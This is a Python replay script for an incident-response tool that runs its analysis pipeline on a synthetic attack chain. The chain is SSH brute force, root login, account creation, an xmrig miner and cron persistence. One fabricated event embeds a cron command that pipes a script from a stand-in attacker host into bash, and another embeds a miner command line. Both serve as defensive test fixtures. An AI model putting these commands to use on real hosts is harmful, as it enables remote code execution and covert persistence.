"""离线演练：不碰真实主机，用合成失陷痕迹跑完整分析并出报告。

用法（在项目根目录）::

    PYTHONPATH=src python scripts/replay.py
    PYTHONPATH=src python scripts/replay.py --workspace .

产物写到 ``<workspace>/runs/<run_id>/``，可用 ``irtrace web`` 打开查看。
"""

from __future__ import annotations

import argparse
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from irtrace.core.context import RunContext  # noqa: E402
from irtrace.core.models import Category, Event  # noqa: E402
from irtrace.core.pipeline import Orchestrator  # noqa: E402
from irtrace.core.registry import registry  # noqa: E402
from irtrace.intel.registry import intel_registry  # noqa: E402


def _build_events() -> list[Event]:
    """一条完整攻击链：爆破 → 登录 → 落地执行 → 挖矿外联 → 可疑持久化。"""
    t0 = datetime(2026, 10, 12, 2, 10, tzinfo=timezone.utc)
    attacker = "45.155.205.233"
    events: list[Event] = []

    for i in range(12):
        events.append(Event(
            timestamp=t0 + timedelta(seconds=20 * i),
            category=Category.AUTH, source="auth_log", action="ssh_failed",
            src_ip=attacker, user="root",
            message=f"Failed password for root from {attacker} port 22",
            tags=["bruteforce"],
        ))

    login_at = t0 + timedelta(minutes=6)
    events.append(Event(
        timestamp=login_at, category=Category.AUTH, source="auth_log",
        action="ssh_login", src_ip=attacker, user="root",
        message=f"Accepted password for root from {attacker} port 22",
        tags=["ssh"],
    ))
    events.append(Event(
        timestamp=login_at + timedelta(minutes=2),
        category=Category.ACCOUNT, source="account", action="sudo",
        user="root", message="root : TTY=pts/0 ; COMMAND=/usr/bin/useradd -m backup",
        tags=["privilege-escalation"],
    ))
    events.append(Event(
        timestamp=login_at + timedelta(minutes=3),
        category=Category.FILE, source="filesystem", action="suspicious_file",
        path="/tmp/.cache/xmrig",
        message="可疑文件 /tmp/.cache/xmrig (exec_from_writable, known_malware_name)",
        tags=["suspicious-file", "known_malware_name"],
    ))
    events.append(Event(
        timestamp=login_at + timedelta(minutes=4),
        category=Category.PROCESS, source="process", action="process_suspicious",
        path="/tmp/.cache/xmrig", pid=4242, user="root",
        message="可疑进程 pid=4242 exe=/tmp/.cache/xmrig cmdline=xmrig -o stratum+tcp://pool.example:3333",
        tags=["suspicious-process", "exec_from_writable"],
    ))
    events.append(Event(
        timestamp=login_at + timedelta(minutes=5),
        category=Category.NETWORK, source="network", action="external_conn",
        dst_ip=attacker, dst_port=3333,
        message=f"外联 {attacker}:3333 (tcp) 进程=xmrig",
        tags=["external-conn", "suspicious-port"],
    ))
    events.append(Event(
        timestamp=login_at + timedelta(minutes=8),
        category=Category.PERSISTENCE, source="persistence",
        action="suspicious_persistence", path="/etc/cron.d/update",
        message="可疑持久化内容 /etc/cron.d/update — */10 * * * * root curl http://evil.example.com/payload.sh | bash",
        tags=["cron", "suspicious-content"],
    ))
    return events


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="离线演练失陷主机攻击链")
    parser.add_argument("--workspace", default=str(ROOT), help="写入 runs/ 的工作区")
    args = parser.parse_args(argv)

    registry.discover()
    intel_registry.discover()
    ctx = RunContext(args.workspace)
    for event in _build_events():
        ctx.add_event(event)

    result = Orchestrator(ctx).run(skip_collect=True)
    ctx.verify_ledger()
    ctx.close()

    summary = result["summary"]
    print(f"演练完成 run_id={summary['run_id']}")
    print(f"事件 {summary['events']}　结论 {summary['findings']}　{summary['findings_by_severity']}")
    print(f"目录 {summary['run_dir']}")
    for path in result["outputs"]:
        print(f"  - {path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
